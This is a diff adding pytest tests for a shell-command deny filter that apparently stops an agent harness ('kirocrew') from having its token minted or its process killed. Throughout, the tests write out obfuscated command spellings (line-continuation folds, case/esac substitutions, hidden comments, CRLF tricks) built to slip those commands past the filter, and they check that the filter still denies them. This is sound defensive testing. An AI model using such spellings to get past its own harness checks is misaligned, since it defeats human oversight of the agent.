+        command = f"T=$(ca\\\nse x in x) printf {self.VERB};; esac); {self.NAME} $T"
+        (body,) = security._substitution_bodies(command)
+        assert f"printf {self.VERB}" in body, body
+        assert security.is_denied(command) is not None
+
+    def test_a_line_continuated_esac_still_ends_the_pattern_rule(self) -> None:
+        """The same folding applies to ``esac``, so the rule disarms where bash does."""
+        (body,) = security._substitution_bodies("$(case x in x) printf hi;; es\\\nac)")
+        assert body == "case x in x) printf hi;; es\\\nac", body
+
+    def test_a_folded_continuation_does_not_make_a_hash_a_comment(self) -> None:
+        """``a\\`` + newline + ``#b`` folds to the single word ``a#b``, which comments nothing."""
+        (body,) = security._substitution_bodies("$(printf a\\\n#b)")
+        assert body == "printf a\\\n#b", body
+
+    def test_a_fold_after_a_word_break_still_opens_a_comment(self) -> None:
+        """What matters is what the fold leaves ADJACENT, not that a fold is there.
+
+        ``:`` + space + ``\\`` + newline + ``#`` folds to ``: #``, so a word break ends
+        up in front of the ``#`` and bash opens a real comment. Reading any preceding
+        fold as "not a comment" missed it in the fail-OPEN direction: the walk then
+        read the ``)`` the comment hides as the closer and truncated the body before
+        the verb, reopening this PR's own bypass for the folded spelling.
+        """
+        command = f"T=$(: \\\n# )\nprintf {self.VERB}); {self.NAME} $T"
+        (body,) = security._substitution_bodies(command)
+        assert f"printf {self.VERB}" in body, body
+        assert security.is_denied(command) is not None
+
+    @pytest.mark.parametrize(
+        "text",
+        ["$(", "`", "$(case", "$(case x in x", "$(: #", "`A='", "$(#", "", "#", "esac)"],
+    )
+    def test_degenerate_input_does_not_raise(self, text: str) -> None:
+        """An unterminated construct yields the remainder, never an exception."""
+        assert isinstance(security._substitution_bodies(text), list)
+
+    def test_an_unproven_span_still_yields_the_whole_remainder(self) -> None:
+        """Fail-CLOSED direction: a body that reaches too far is only over-scanned."""
+        (body,) = security._substitution_bodies(f"$(case x in x) printf {self.VERB}")
+        assert f"printf {self.VERB}" in body, body
+
+
+class TestSelfTokensFoldLineContinuations:
+    """``_self_tokens`` folds ``\\`` + newline away BEFORE tokenizing.
+
+    The shell removes a line continuation while READING, before it tokenizes
+    anything, so the two characters vanish. ``_self_tokens`` folds them the same
+    way, which keeps an assignment and the invocation it feeds in ONE command:
+    ``$T`` resolves and the ``kirocrew token`` argv pair forms, so the
+    self-protection check sees the command bash assembles and runs. A quote-blind
+    fold is safe here because this view only feeds the deny-direction
+    self-protection predicates.
+
+    Both directions are asserted: the continuation spelling matches its folded
+    twin, and a REAL unescaped newline -- which the shell keeps as a separator --
+    keeps its verdict on both the benign and the denied side.
+    """
+
+    VERB = "tok" + "en"
+    NAME = "kiro" + "crew"
+
+    def test_a_continuation_is_folded_not_read_as_a_separator(self) -> None:
+        """The token list carries no ``';'`` -- the pair vanishes, as in bash."""
+        command = f"T=$(ca\\\nse x in x) printf {self.VERB};; esac); {self.NAME} $T"
+        tokens = security._self_tokens(command.lower())
+        assert ";" not in tokens, tokens
+        assert tokens[0] == "t=$(case", tokens
+
+    def test_the_assignment_then_invoke_continuation_spelling_is_denied(self) -> None:
+        """The documented assignment-then-invoke shape denies once the fold keeps the pair together."""
+        command = f"T=$(ca\\\nse x in x) printf {self.VERB};; esac); {self.NAME} $T"
+        assert security.is_denied(command) is not None
+
+    def test_the_folded_spelling_is_denied_alongside_the_plain_one(self) -> None:
+        """The continuation spelling and its folded twin get the same verdict."""
+        folded = f"T=$(case x in x) printf {self.VERB};; esac); {self.NAME} $T"
+        plain = f"{self.NAME} {self.VERB}"
+        assert security.is_denied(folded) is not None
+        assert security.is_denied(plain) is not None
+
+    def test_a_continuation_inside_the_program_name_still_denies(self) -> None:
+        """``kiro\\`` + newline + ``crew token`` is one word to bash, so it denies."""
+        assert security.is_denied(f"{self.NAME[:4]}\\\n{self.NAME[4:]} {self.VERB}") is not None
+
+    def test_a_continuation_inside_a_module_name_reaches_the_floor(self) -> None:
+        """The cheap floor prefilter must fold before it decides it cannot fire.
+
+        ``_self_floor_can_fire`` strips removable quote and backslash glue before
+        looking for the product name. A ``\\`` + newline leaves a newline behind
+        once the backslash goes, which pushes the two halves of ``kiro_crew`` past
+        the hint's one-separator budget -- so the gate answered "provably cannot
+        fire" and the whole argv scan was skipped for a command bash mints from.
+        """
+        command = f"python -m {self.NAME[:4]}\\\n_crew {self.VERB}"
+        assert security.argv_floor._self_floor_can_fire(command) is True
+        assert security.is_denied(command) is not None
+
+    def test_an_even_backslash_run_is_not_a_continuation(self) -> None:
+        """``\\\\`` before a newline is an escaped literal backslash, so the line ENDS.
+
+        Only a LONE ``\\`` + newline continues a line. Bash runs a mint on the
+        second line of ``true\\\\`` + newline + ``python -m kirocrew token``; a
+        fold that joined any backslash-newline would mangle the ``python`` token
+        and hide the mint, so the fold must leave the even run intact and the
+        mint on its own line must still deny.
+        """
+        command = f"true\\\\\npython -m {self.NAME} {self.VERB}"
+        assert security.is_denied(command) is not None
+
+    def test_a_backslash_crlf_is_not_a_continuation(self) -> None:
+        """``\\`` + CRLF is NOT a continuation: bash escapes the CR and the LF ends the line.
+
+        Measured against bash: ``echo a\\`` + CRLF + ``echo b`` runs two
+        commands. So ``true\\`` + CRLF + ``python -m kirocrew token`` runs the
+        mint on the second line, and folding the ``\\`` + CRLF away would join
+        ``true`` and ``python`` and hide the mint from the argv check.
+        """
+        command = f"true\\\r\npython -m {self.NAME} {self.VERB}"
+        assert security.is_denied(command) is not None
+
+    def test_an_even_backslash_run_before_crlf_is_not_a_continuation(self) -> None:
+        """``\\\\`` + CRLF ends the line just as ``\\\\`` + LF does; the mint on line two denies."""
+        command = f"true\\\\\r\npython -m {self.NAME} {self.VERB}"
+        assert security.is_denied(command) is not None
+
+    def test_a_real_newline_still_separates_commands(self) -> None:
+        """An UNESCAPED newline is a separator; folding must not touch it.
+
+        Pins the TOKEN view, not just the verdict: a continuation folds two words
+        into one (``echo a\\<newline>b`` -> ``echo ab``) while a real newline keeps
+        them apart (``echo a<newline>b`` -> ``echo a b``), so the two spellings
+        must not tokenize alike. Asserting only ``is_denied`` here would pass even
+        if the fold ate real newlines too, since neither command is a mint.
+        """
+        assert security._self_tokens("echo a\\\nb") == ["echo", "ab"]
+        assert security._self_tokens("echo a\nb") == ["echo", "a", "b"]
+        assert security.is_denied("echo a\necho b") is None
+
+    def test_a_real_newline_mint_keeps_its_denial(self) -> None:
+        """A mint on its own line after a real newline stays denied."""
+        assert security.is_denied(f"echo a\n{self.NAME} {self.VERB}") is not None
+
+    def test_a_benign_continuation_stays_allowed(self) -> None:
+        """Folding shapes the argv only -- a harmless command must not start refusing."""
+        assert security.is_denied("echo a\\\nb") is None
+
+    def test_a_quoted_separator_still_stays_inside_its_token(self) -> None:
+        """The fold must not disturb shlex's quote resolution downstream."""
+        tokens = security._self_tokens(f"pkill -f '[;]*{self.NAME}'")
+        assert f"[;]*{self.NAME}" in tokens, tokens
